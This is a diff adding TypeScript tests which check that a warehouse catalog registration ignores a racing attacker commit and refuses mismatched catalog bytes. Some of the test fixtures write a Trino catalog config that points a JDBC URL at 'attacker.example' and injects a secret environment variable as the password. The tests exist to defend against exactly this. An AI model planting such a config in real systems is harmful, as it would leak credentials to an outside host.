@@ -12,7 +12,7 @@ import { config } from '@core/kernel/config';
 import { mkdtempSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
-import { readBlob } from '@core/infra/git-store';
+import { commitSubtree, readBlob } from '@core/infra/git-store';
 
 // Force external connectors ON for this suite (createConnection gates on it).
 (config as { externalConnectorsEnabled: boolean }).externalConnectorsEnabled = true;
@@ -114,4 +114,68 @@ test('discoverWarehouse: Fabric is honestly not-discoverable (no metastore)', as
 
 test.after(() => {
   globalThis.fetch = _realFetch;
+});
+
+// ------------------------------------------------ WP-50 review: git is the record, never an input --
+
+async function pgConn(owner = builder) {
+  return createConnection(owner, {
+    name: 'PG sales',
+    template: 'warehouse',
+    endpoint: '',
+    credential: '',
+    warehouse: { platform: 'postgresql', catalog: 'pg_race', fields: { host: 'db.internal', database: 'sales', username: 'reader', password: 'not-in-git' } },
+  });
+}
+
+test('RACE TWIN: a push of catalog.properties to an attacker host before Register never reaches Trino', async () => {
+  __resetConnections();
+  const c = await pgConn();
+  const { awaitConnectionCommits } = await import('@tabs/connections/lib/git/commit');
+  await awaitConnectionCommits();
+  // An attacker's commit (written straight to the repo, as a racing push would land).
+  await commitSubtree('sales', 'connections/', new Map([
+    ['connections/pg_race/catalog.properties', 'connector.name=postgresql\nconnection-url=jdbc:postgresql://attacker.example:5432/x\nconnection-user=u\nconnection-password=${ENV:POLARIS_CLIENT_SECRET}\n'],
+  ]), { author: { name: 'mallory', email: 'm@example.com' }, message: 'evil', reposDir: config.reposDir });
+  const { k8s, calls } = recordingK8s(200);
+  const out = await registerWarehouseCatalog(c.id, builder, { k8s });
+  assert.equal(out.ok, true, out.detail);
+  const cm = calls.find((x) => x.path.endsWith('/configmaps/trino-catalog'))!.body as { data: Record<string, string> };
+  const applied = cm.data['pg_race.properties'];
+  assert.doesNotMatch(applied, /attacker|POLARIS/);
+  assert.match(applied, /db\.internal/);
+  // What Trino got is exactly the committed file AT THE SHA the registration recorded.
+  assert.equal(applied, await readBlob('sales', out.gitSha, 'connections/pg_race/catalog.properties', { reposDir: config.reposDir }));
+});
+
+test('Register reads the catalog at the EXACT sha its own commit returned, not at HEAD', async () => {
+  __resetConnections();
+  const c = await pgConn();
+  const refs: (string | undefined)[] = [];
+  const { readCatalogFromGit } = await import('@tabs/connections/lib/git/commit');
+  const out = await registerWarehouseCatalog(c.id, builder, {
+    k8s: recordingK8s(200).k8s,
+    readCatalog: (domain, catalog, opts) => {
+      refs.push(opts?.ref);
+      return readCatalogFromGit(domain, catalog, opts);
+    },
+  });
+  assert.equal(out.ok, true);
+  assert.equal(refs.length, 1);
+  assert.match(String(refs[0]), /^[0-9a-f]{40}$/);
+  assert.equal(refs[0], out.gitSha);
+});
+
+test('NEGATIVE: bytes at the sha that differ from the OS render refuse Register; nothing reaches the cluster', async () => {
+  __resetConnections();
+  const c = await pgConn();
+  const { k8s, calls } = recordingK8s(200);
+  await assert.rejects(
+    registerWarehouseCatalog(c.id, builder, {
+      k8s,
+      readCatalog: async (_d, _c, opts) => ({ sha: opts!.ref!, path: 'connections/pg_race/catalog.properties', text: 'connector.name=postgresql\nconnection-url=jdbc:postgresql://attacker.example/x\n', props: {} }),
+    }),
+    (e: Error & { status?: number }) => e.status === 409 && /does not match/.test(e.message),
+  );
+  assert.deepEqual(calls, [], 'no ConfigMap, no Secret, no rollout');
 });
